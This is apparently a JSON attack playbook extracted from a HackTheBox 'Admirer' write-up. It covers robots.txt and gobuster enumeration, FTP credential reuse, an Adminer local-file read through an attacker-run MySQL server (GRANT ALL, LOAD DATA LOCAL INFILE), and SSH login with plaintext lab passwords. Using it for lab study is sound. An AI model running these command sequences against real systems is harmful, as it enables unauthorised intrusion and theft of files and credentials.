@@ -1,0 +1,917 @@
+{
+  "writeup_id": "Htb_Admirer",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_ftp_credential_disclosure",
+    "primary_services": [
+      "http",
+      "ftp",
+      "ssh"
+    ],
+    "port_signature": "21+22+80",
+    "service_combination": "ftp+ssh+http",
+    "os_family": "linux",
+    "environment_type": "web_server",
+    "entry_vector": "credential_disclosure",
+    "privilege_path": "web_enum_to_ftp_to_ssh",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.9,
+    "distinguishing_factors": [
+      "robots_txt_disclosure",
+      "admin_directory_enumeration",
+      "credential_files_exposed",
+      "ftp_source_code_access"
+    ],
+    "environmental_clues": [
+      "php_web_application",
+      "debian_linux_server",
+      "vsftpd_service",
+      "apache_webserver"
+    ],
+    "similar_scenarios": [
+      "basic_web_enum_boxes",
+      "credential_disclosure_scenarios"
+    ],
+    "unique_aspects": [
+      "adminer_database_interface",
+      "python_library_hijack_privesc",
+      "local_file_read_via_database"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "robots.txt_enumeration",
+        "success_reason": "robots.txt exposed sensitive directory path with credentials",
+        "prerequisite_indicators": [
+          "web_server_accessible",
+          "robots_txt_exists",
+          "directory_listing_disabled"
+        ],
+        "recognition_patterns": [
+          "disallow entries in robots.txt",
+          "comments mentioning sensitive data",
+          "username references in comments"
+        ],
+        "failure_modes": [
+          "no_robots_txt_file",
+          "empty_disallow_entries",
+          "proper_access_controls"
+        ],
+        "environmental_factors": [
+          "developer_oversight",
+          "insufficient_security_awareness",
+          "default_web_configurations"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "directory_bruteforce_with_extensions",
+        "success_reason": "Found credentials.txt and contacts.txt in /admin-dir using multiple file extensions",
+        "prerequisite_indicators": [
+          "web_directory_accessible",
+          "no_directory_listing",
+          "sensitive_files_present"
+        ],
+        "recognition_patterns": [
+          "403 forbidden on directory access",
+          "predictable filename patterns",
+          "multiple file extensions needed"
+        ],
+        "failure_modes": [
+          "proper_access_controls",
+          "files_outside_webroot",
+          "non_standard_extensions"
+        ],
+        "environmental_factors": [
+          "developer_convenience_over_security",
+          "backup_files_in_webroot",
+          "insufficient_hardening"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "ftp_credential_reuse",
+        "success_reason": "Credentials from web enumeration worked for FTP access",
+        "prerequisite_indicators": [
+          "ftp_service_available",
+          "credentials_discovered",
+          "no_anonymous_access"
+        ],
+        "recognition_patterns": [
+          "credential files contain ftp accounts",
+          "service-specific credential sections",
+          "password complexity patterns"
+        ],
+        "failure_modes": [
+          "credentials_expired",
+          "ftp_service_disabled",
+          "account_lockout_policies"
+        ],
+        "environmental_factors": [
+          "credential_reuse_practices",
+          "multiple_service_access",
+          "weak_password_policies"
+        ],
+        "success_probability": 0.89,
+        "typical_timeframe": "1-3 minutes"
+      },
+      {
+        "technique": "source_code_analysis",
+        "success_reason": "FTP contained outdated source code revealing database credentials and hidden directories",
+        "prerequisite_indicators": [
+          "ftp_access_available",
+          "source_code_backups_present",
+          "version_differences_exist"
+        ],
+        "recognition_patterns": [
+          "tar.gz or zip files in ftp",
+          "html/php source archives",
+          "database connection strings"
+        ],
+        "failure_modes": [
+          "no_source_backups",
+          "identical_versions",
+          "credentials_sanitized"
+        ],
+        "environmental_factors": [
+          "backup_practices",
+          "development_workflow_issues",
+          "version_control_gaps"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "5-15 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "credentials.txt file",
+        "discovery_method": "gobuster with multiple extensions on /admin-dir",
+        "why_critical": "Provided FTP access leading to source code disclosure",
+        "how_to_recognize": [
+          "predictable sensitive filenames",
+          "structured credential format",
+          "multiple service accounts"
+        ],
+        "follow_up_actions": [
+          "test_all_discovered_credentials",
+          "enumerate_all_mentioned_services",
+          "check_credential_reuse_patterns"
+        ]
+      },
+      {
+        "discovery": "outdated source code in FTP",
+        "discovery_method": "FTP recursive download with discovered credentials",
+        "why_critical": "Revealed hidden utility-scripts directory and database credentials",
+        "how_to_recognize": [
+          "archive files in ftp root",
+          "version differences in source",
+          "todo comments indicating alternatives"
+        ],
+        "follow_up_actions": [
+          "compare_source_versions",
+          "extract_all_credentials",
+          "enumerate_hidden_directories"
+        ]
+      },
+      {
+        "discovery": "utility-scripts directory",
+        "discovery_method": "source code analysis from FTP archive",
+        "why_critical": "Contains db_admin.php hinting at Adminer interface",
+        "how_to_recognize": [
+          "utility or admin directory names",
+          "database administration scripts",
+          "todo comments about alternatives"
+        ],
+        "follow_up_actions": [
+          "enumerate_utility_directory",
+          "test_database_interfaces",
+          "look_for_adminer_installations"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "anonymous_web",
+        "escalation_method": "robots.txt_to_credentials",
+        "why_possible": "Developer left sensitive files accessible with only directory listing disabled",
+        "recognition_signs": [
+          "robots_txt_with_comments",
+          "disallow_entries_present",
+          "403_on_directory_access"
+        ],
+        "exploitation_path": "robots.txt → /admin-dir → gobuster → credentials.txt"
+      },
+      {
+        "privilege_level": "web_credentials",
+        "escalation_method": "credential_reuse_to_ftp",
+        "why_possible": "Same credentials used across multiple services",
+        "recognition_signs": [
+          "multiple_service_credentials_found",
+          "ftp_service_available",
+          "credential_format_matches"
+        ],
+        "exploitation_path": "credentials.txt → FTP access → source code download"
+      },
+      {
+        "privilege_level": "source_access",
+        "escalation_method": "version_comparison_analysis",
+        "why_possible": "Outdated source revealed current system information",
+        "recognition_signs": [
+          "archive_files_in_ftp",
+          "todo_comments_present",
+          "database_connection_strings"
+        ],
+        "exploitation_path": "FTP source → utility-scripts discovery → Adminer interface"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 21,22,80 open on Linux host with robots.txt revealing admin directory",
+        "decision": "Enumerate web directories and check robots.txt disallowed paths first",
+        "reasoning": "robots.txt explicitly mentions credentials location, high probability find",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ftp_bruteforce",
+            "when": "if no web creds found"
+          },
+          {
+            "option": "ssh_enumeration",
+            "when": "if usernames discovered"
+          }
+        ],
+        "success_indicators": [
+          "credentials_file_found",
+          "contacts_file_found",
+          "ftp_credentials_discovered"
+        ],
+        "next_decision": "access_ftp_with_found_creds"
+      },
+      {
+        "step": 2,
+        "situation": "Found FTP credentials in web directory",
+        "decision": "Access FTP and download all available files for source code analysis",
+        "reasoning": "Source code often contains additional credentials and reveals application structure",
+        "confidence": 0.95,
+        "prerequisites": [
+          "ftp_credentials_obtained"
+        ],
+        "success_indicators": [
+          "source_code_downloaded",
+          "database_credentials_found",
+          "additional_directories_revealed"
+        ],
+        "failure_fallbacks": [
+          "credential_reuse_testing",
+          "web_vulnerability_scanning"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Source code reveals database admin interface and multiple password sets",
+        "decision": "Look for database administration tools like Adminer/phpMyAdmin",
+        "reasoning": "Comment suggests open source DB admin alternative, box name hints at Adminer",
+        "confidence": 0.85,
+        "prerequisites": [
+          "source_code_analyzed",
+          "utility_scripts_directory_known"
+        ],
+        "success_indicators": [
+          "adminer_interface_found",
+          "db_admin_login_accessible"
+        ],
+        "failure_fallbacks": [
+          "password_reuse_testing",
+          "direct_database_connection_attempts"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Found Adminer interface but local database credentials don't work",
+        "decision": "Setup local MySQL server and connect Adminer to it for local file inclusion",
+        "reasoning": "Adminer vulnerability allows reading local files through external database connection",
+        "confidence": 0.8,
+        "prerequisites": [
+          "adminer_interface_accessible",
+          "local_mysql_configured"
+        ],
+        "success_indicators": [
+          "external_db_connection_successful",
+          "local_file_read_capability"
+        ],
+        "failure_fallbacks": [
+          "credential_bruteforce",
+          "other_web_vulnerabilities"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_robots_txt_found": {
+        "action": "enumerate_disallowed_directories",
+        "tools": [
+          "gobuster",
+          "curl"
+        ],
+        "next_phase": "credential_extraction"
+      },
+      "if_ftp_creds_found": {
+        "action": "download_all_ftp_contents",
+        "tools": [
+          "wget",
+          "ftp"
+        ],
+        "next_phase": "source_code_analysis"
+      },
+      "if_source_code_obtained": {
+        "action": "analyze_for_additional_paths_and_creds",
+        "purpose": "find_hidden_functionality",
+        "tools": [
+          "grep",
+          "find",
+          "manual_review"
+        ]
+      },
+      "if_adminer_found": {
+        "action": "attempt_local_file_inclusion_via_external_db",
+        "tools": [
+          "mysql",
+          "adminer"
+        ],
+        "next_phase": "file_system_enumeration"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_robots_txt_on_web_applications",
+        "reasoning": "often_reveals_sensitive_directories_and_files",
+        "applicability": "web_application_targets"
+      },
+      {
+        "rule": "download_all_accessible_source_code_immediately",
+        "reasoning": "source_code_contains_credentials_and_reveals_attack_surface",
+        "applicability": "ftp_or_file_access_obtained"
+      },
+      {
+        "rule": "test_database_admin_interfaces_with_external_connections",
+        "reasoning": "adminer_and_similar_tools_vulnerable_to_local_file_inclusion",
+        "applicability": "database_admin_interfaces_found"
+      },
+      {
+        "rule": "analyze_comments_in_source_code_for_hints",
+        "reasoning": "developers_often_leave_implementation_clues_in_comments",
+        "applicability": "source_code_analysis_phase"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Directory Bruteforce",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_server_accessible",
+          "directory_listing_disabled",
+          "hidden_directories_exist"
+        ],
+        "success_indicators": [
+          "robots_txt_present",
+          "403_forbidden_responses",
+          "common_extensions_found"
+        ],
+        "incompatible_with": [
+          "rate_limiting_aggressive",
+          "waf_blocking_requests",
+          "complete_directory_listing"
+        ],
+        "confidence_boosters": [
+          "robots_txt_disallow_entries",
+          "backup_file_patterns",
+          "admin_directory_hints"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Credential Harvesting from Files",
+        "mitre_id": "T1552.001",
+        "required_services": [
+          "http",
+          "https",
+          "ftp"
+        ],
+        "required_ports": [
+          21,
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "accessible_file_system",
+          "credential_files_present",
+          "weak_access_controls"
+        ],
+        "success_indicators": [
+          "txt_files_with_credentials",
+          "config_files_accessible",
+          "backup_files_found"
+        ],
+        "incompatible_with": [
+          "encrypted_credential_storage",
+          "proper_file_permissions",
+          "credential_rotation_active"
+        ],
+        "confidence_boosters": [
+          "development_environment_indicators",
+          "default_credential_patterns",
+          "multiple_service_accounts"
+        ],
+        "typical_success_rate": 0.82,
+        "estimated_time": "5-20 minutes"
+      },
+      {
+        "technique": "FTP Anonymous/Credential Access",
+        "mitre_id": "T1021.003",
+        "required_services": [
+          "ftp"
+        ],
+        "required_ports": [
+          21
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "ftp_service_running",
+          "credentials_available_or_anonymous_enabled"
+        ],
+        "success_indicators": [
+          "successful_login",
+          "file_listing_accessible",
+          "source_code_present"
+        ],
+        "incompatible_with": [
+          "ftp_disabled",
+          "strong_authentication_required",
+          "network_segmentation"
+        ],
+        "confidence_boosters": [
+          "vsftpd_service_detected",
+          "development_file_patterns",
+          "backup_archives_present"
+        ],
+        "typical_success_rate": 0.68,
+        "estimated_time": "5-15 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "apache",
+          "nginx"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "nginx",
+          "IIS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "ftp_service": {
+        "port_indicators": [
+          21
+        ],
+        "service_indicators": [
+          "ftp",
+          "vsftpd"
+        ],
+        "banner_indicators": [
+          "vsftpd",
+          "ProFTPD",
+          "FileZilla"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "linux_system": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh",
+          "openssh"
+        ],
+        "banner_indicators": [
+          "OpenSSH",
+          "Debian",
+          "Ubuntu"
+        ],
+        "confidence_threshold": 0.85
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "robots_txt_enumeration",
+          "when": "web_service_detected",
+          "reason": "often_reveals_hidden_directories_quickly"
+        },
+        {
+          "attack": "directory_bruteforce_with_extensions",
+          "when": "php_detected_and_forbidden_directories_found",
+          "reason": "high_success_rate_for_credential_files"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "ftp_credential_access",
+          "when": "ftp_service_detected_and_credentials_found",
+          "reason": "reliable_but_requires_prior_credential_discovery"
+        },
+        {
+          "attack": "web_form_testing",
+          "when": "contact_forms_present",
+          "reason": "potential_sqli_but_lower_success_rate"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Web Directory Enumeration",
+        "mitre_id": "T1083",
+        "category": "discovery",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "gobuster",
+            "command_template": "gobuster dir -u {url} -w {wordlist} -x {extensions} -t {threads}",
+            "actual_command": "gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,html -t 20",
+            "output_pattern": "/{filename} (Status: 200)",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "web_service_accessible",
+          "robots_txt_hints_available"
+        ],
+        "success_indicators": [
+          "sensitive_files_discovered",
+          "credentials_found",
+          "configuration_files_exposed"
+        ],
+        "common_failures": [
+          "insufficient_wordlist_coverage",
+          "missing_file_extensions",
+          "rate_limiting_blocks_requests"
+        ],
+        "follow_up_techniques": [
+          "credential_harvesting",
+          "ftp_access",
+          "source_code_analysis"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "FTP Source Code Extraction",
+        "mitre_id": "T1005",
+        "category": "collection",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "wget",
+            "command_template": "wget --user {username} --password '{password}' -m ftp://{target}",
+            "actual_command": "wget --user ftpuser --password '%n?4Wz}R$tTF7' -m ftp://10.10.10.187",
+            "output_pattern": "dump.sql, html.tar.gz downloaded",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "ftp_credentials_obtained",
+          "ftp_service_accessible"
+        ],
+        "success_indicators": [
+          "source_code_archives_downloaded",
+          "database_credentials_found",
+          "hidden_directories_revealed"
+        ],
+        "common_failures": [
+          "invalid_credentials",
+          "empty_ftp_directory",
+          "network_connectivity_issues"
+        ],
+        "follow_up_techniques": [
+          "source_code_analysis",
+          "credential_extraction",
+          "web_application_enumeration"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Adminer Database Interface Exploitation",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "mysql",
+            "command_template": "LOAD DATA LOCAL INFILE '{file_path}' INTO TABLE {db}.{table} FIELDS TERMINATED BY \"\\n\"",
+            "actual_command": "LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE pwn.exfil FIELDS TERMINATED BY \"\\n\"",
+            "output_pattern": "Query OK, {n} rows affected",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "adminer_interface_accessible",
+          "mysql_server_controlled_by_attacker",
+          "network_connectivity_between_target_and_attacker_db"
+        ],
+        "success_indicators": [
+          "local_file_contents_extracted",
+          "database_credentials_obtained",
+          "sensitive_configuration_files_read"
+        ],
+        "common_failures": [
+          "mysql_configuration_blocks_remote_connections",
+          "file_permissions_prevent_reading",
+          "network_filtering_blocks_database_connection"
+        ],
+        "follow_up_techniques": [
+          "credential_reuse_testing",
+          "ssh_authentication",
+          "privilege_escalation"
+        ],
+        "time_investment": "30-60 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "MySQL Remote Connection Setup",
+        "mitre_id": "T1021.001",
+        "category": "lateral_movement",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "mysql",
+            "command_template": "GRANT ALL PRIVILEGES ON *.* TO {user}@{remote_ip} IDENTIFIED by '{password}' WITH GRANT OPTION;",
+            "actual_command": "GRANT ALL PRIVILEGES ON *.* TO root@10.10.10.187 IDENTIFIED by '0xdf' WITH GRANT OPTION;",
+            "output_pattern": "Query OK, 0 rows affected",
+            "effectiveness_rating": 4,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "mysql_server_access",
+          "bind_address_configured_for_remote_access",
+          "target_ip_known"
+        ],
+        "success_indicators": [
+          "remote_connection_established",
+          "adminer_successfully_connects",
+          "file_read_operations_successful"
+        ],
+        "common_failures": [
+          "firewall_blocks_mysql_port",
+          "bind_address_misconfiguration",
+          "authentication_plugin_incompatibility"
+        ],
+        "follow_up_techniques": [
+          "local_file_inclusion_via_sql",
+          "configuration_file_extraction",
+          "credential_harvesting"
+        ],
+        "time_investment": "15-45 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "gobuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "dirbuster",
+          "ffuf",
+          "dirb"
+        ],
+        "best_practices": [
+          "use_multiple_wordlists",
+          "include_relevant_file_extensions",
+          "adjust_thread_count_based_on_target_response"
+        ]
+      },
+      {
+        "tool": "adminer",
+        "use_case": "local_file_inclusion_via_database_interface",
+        "effectiveness_rating": 5,
+        "reliability": 0.9,
+        "learning_curve": "medium",
+        "essential_for": [
+          "database_administration_interface_exploitation"
+        ],
+        "alternatives": [
+          "phpmyadmin",
+          "direct_mysql_connection"
+        ],
+        "best_practices": [
+          "setup_attacker_controlled_mysql_server",
+          "configure_remote_access_properly",
+          "target_readable_configuration_files"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "web_enumeration_to_ftp_access",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl http://10.10.10.187/robots.txt",
+            "purpose": "Identify restricted directories",
+            "expected_output": "Disallow: /admin-dir"
+          },
+          {
+            "step": 2,
+            "command": "gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,html -t 20",
+            "purpose": "Enumerate files in restricted directory",
+            "expected_output": "/contacts.txt (Status: 200), /credentials.txt (Status: 200)"
+          },
+          {
+            "step": 3,
+            "command": "curl http://10.10.10.187/admin-dir/credentials.txt",
+            "purpose": "Extract FTP credentials",
+            "expected_output": "ftpuser, %n?4Wz}R$tTF7"
+          },
+          {
+            "step": 4,
+            "command": "wget --user ftpuser --password '%n?4Wz}R$tTF7' -m ftp://10.10.10.187",
+            "purpose": "Download source code from FTP",
+            "expected_output": "dump.sql, html.tar.gz downloaded"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "20-40 minutes"
+      },
+      {
+        "sequence_name": "adminer_lfi_to_ssh_access",
+        "steps": [
+          {
+            "step": 1,
+            "command": "GRANT ALL PRIVILEGES ON *.* TO root@10.10.10.187 IDENTIFIED by '0xdf' WITH GRANT OPTION;",
+            "purpose": "Configure MySQL for remote access",
+            "expected_output": "Query OK, 0 rows affected"
+          },
+          {
+            "step": 2,
+            "command": "CREATE DATABASE pwn; CREATE TABLE exfil (data VARCHAR(256));",
+            "purpose": "Setup database for file exfiltration",
+            "expected_output": "Database and table created"
+          },
+          {
+            "step": 3,
+            "command": "LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE pwn.exfil FIELDS TERMINATED BY \"\\n\"",
+            "purpose": "Extract current source code via Adminer",
+            "expected_output": "Database credentials: &<h5b~yK3F#{PaPB&dA}{H>"
+          },
+          {
+            "step": 4,
+            "command": "sshpass -p '&<h5b~yK3F#{PaPB&dA}{H>' ssh waldo@10.10.10.187",
+            "purpose": "SSH access with extracted credentials",
+            "expected_output": "Shell as waldo user"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "45-90 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Admirer",
+      "difficulty": "Easy",
+      "os": "Linux (Debian)",
+      "platform": "HackTheBox",
+      "release_date": "2020-05-02",
+      "author": "polarbearer & GibParadox",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "beginner_to_intermediate",
+      "primary_attack_vectors": [
+        "web_enumeration",
+        "database_interface_abuse",
+        "sudo_misconfiguration"
+      ],
+      "key_vulnerabilities": [
+        "adminer_lfi",
+        "credential_reuse",
+        "pythonpath_hijacking"
+      ],
+      "environment_type": "web_application_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "web_enumeration",
+        "database_tool_exploitation",
+        "python_library_hijacking"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_enumeration",
+        "ftp_basics",
+        "python_path_concepts"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "database_exploitation",
+        "privilege_escalation",
+        "enumeration"
+      ],
+      "attack_types": [
+        "credential_access",
+        "local_file_inclusion",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_database_interfaces",
+        "proper_sudo_configuration",
+        "credential_management"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Jasmin",
+        "Networked",
+        "Postman"
+      ],
+      "similarity_reasons": [
+        "web_enumeration_heavy",
+        "credential_discovery",
+        "sudo_privesc"
+      ],
+      "unique_aspects": [
+        "adminer_database_lfi",
+        "reverse_database_connection",
+        "pythonpath_exploitation"
+      ],
+      "difficulty_factors": [
+        "multi_stage_enumeration",
+        "creative_database_abuse",
+        "sudo_path_manipulation"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T19:08:21.730661",
+    "original_file": "0xdf_writeups/Htb Admirer.md",
+    "content_length": 28281,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
